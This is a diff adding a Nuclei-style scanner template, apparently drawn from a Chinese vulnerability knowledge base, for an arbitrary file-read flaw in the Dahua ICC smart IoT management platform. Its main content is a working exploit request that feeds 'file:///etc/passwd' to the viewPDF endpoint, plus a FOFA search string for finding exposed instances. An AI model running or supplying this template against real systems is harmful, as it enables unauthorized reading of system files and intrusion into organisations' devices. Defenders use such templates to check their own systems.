@@ -1,0 +1,27 @@
+id: poc-tyzrtlill1znp9d2
+info:
+  name: 大华ICC智能物联管理平台 viewPDF 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tyzrtlill1znp9d2'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tyzrtlill1znp9d2
+    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
+http:
+- raw:
+  - 'GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
